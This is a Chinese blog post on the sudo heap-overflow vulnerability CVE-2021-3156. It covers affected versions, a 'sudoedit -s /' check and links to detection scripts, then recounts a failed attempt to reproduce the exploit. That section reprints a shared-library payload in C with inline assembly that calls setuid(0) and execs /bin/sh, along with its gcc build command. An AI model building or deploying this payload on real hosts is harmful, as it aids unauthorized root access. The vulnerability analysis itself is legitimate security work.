一、事件概述


1月26日，来自 Qualys Security 社区的一篇文章轰动了几天安全圈子，其在文章中爆出针对Sudo的常用版本存在溢出提权的漏洞，漏洞编号为CVE-2021-3156


引用 Qualys Security 的内容：

The Qualys Research Team has discovered a heap overflow vulnerability in sudo, a near-ubiquitous utility available on major Unix-like operating systems. 

Any unprivileged user can gain root privileges on a vulnerable host using a default sudo configuration by exploiting this vulnerability

https://blog.qualys.com/vulnerabilities-research/2021/01/26/cve-2021-3156-heap-based-buffer-overflow-in-sudo-baron-samedit


大致内容为：通过该漏洞可对受影响的sudo直接提权为root权限，且引发该漏洞的代码是sudo开发者在 2011年7月的(commit 8255ed69)中引发的，也就是说该漏洞已经存在了10年之久。该漏洞分别在Ubuntu 20.04（Sudo 1.8.31），Debian 10（Sudo 1.8.27）和Fedora 33（Sudo 1.9.2）中测试均成功


作者电脑也是 Linux 我特意去看了一下自己电脑的sudo版本：

即使在 Debian testing （Debian较新的程序将优先在sid / testing中发型）中的sudo版本也是受影响的，且testing源中的sudo版本目前也停留在1.9.5p1仍是受影响版本。


作者使用检测脚本发现自己的Linux也是存在该漏洞的，后文将给出检测代码




二、漏洞影响范围


该漏洞是sudo引发的理论上再任意Linux发行版中使用该程序都会受影响，可以说影响范围颇广，但sudo程序一般仅在类unix操作系统中，现在的windows将不受影响。


Sudo 1.8.2 – 1.8.31p2Sudo 1.9.0 – 1.9.5p1




三、关于Sudo

sudo is a program for Unixlike computer operating systems that allows 

users to run programs with the security privileges of another user, by default the superuser. 

It originally stood for "superuser do" as the older versions of sudo were designed to run commands only as the superuser.

https://en.wikipedia.org/wiki/Sudo



三、漏洞验证


如何在类unix操作系统中验证是否存在该漏洞，可以使用以下代码

sudoedit -s /
若出现sudoedit: /: xxxx字样则可能存在漏洞


若以usage: 字段开头则无该漏洞
Github中已经有很多该漏洞的检测脚本https://github.com/reverse-ex/CVE-2021-3156https://github.com/mr-r3b00t/CVE-2021-3156https://github.com/Serpentiel/CVE-2021-3156... ...




四、漏洞复测


我们查阅了Github和一些资料并没有发现完整的利用文件

期初在Github中: https://github.com/reverse-ex/CVE-2021-3156 中披露了以下文件  xxxx.c

static void __attribute__((constructor)) _init(void) {  __asm __volatile__(      "addq $64, %rsp;"      // setuid(0);      "movq $105, %rax;"      "movq $0, %rdi;"      "syscall;"      // setgid(0);      "movq $106, %rax;"      "movq $0, %rdi;"      "syscall;"      // dup2(0, 1);      "movq $33, %rax;"      "movq $0, %rdi;"      "movq $1, %rsi;"      "syscall;"      // dup2(0, 2);      "movq $33, %rax;"      "movq $0, %rdi;"      "movq $2, %rsi;"      "syscall;"      // execve("/bin/sh");      "movq $59, %rax;"      "movq $0x0068732f6e69622f, %rdi;"      "pushq %rdi;"      "movq %rsp, %rdi;"      "movq $0, %rdx;"      "pushq %rdx;"      "pushq %rdi;"      "movq %rsp, %rsi;"      "syscall;"      // exit(0);      "movq $60, %rax;"      "movq $0, %rdi;"      "syscall;");}

实际上这个库写的很模糊readme也不完整，接着通过万能的网上朋友给出了编译命令:

gcc -fpic -shared -nostdlib -o libnss_X/X.so.2 la.c

肯定会有报错:

/usr/bin/ld: cannot open output file libnss_X/X.so.2: No such file or directory



于是追溯到发布该漏洞的Qualys社区，在观察了作者提供的复现视频后发现，现有的Github中的项目给出的均是视频中提到的两个xxx.c文件中的其中一个，还有一个expolit.c文件并没有被公开，目前该社区还没有公开利用文件的计划，


观察视频才发现上述报错是要存在libnss_X目录，目前Github这些库有很多糟点，公开的不完整也没有给出说明，希望其他复测的小伙伴不要踩坑。

视频：https://vimeo.com/504872555
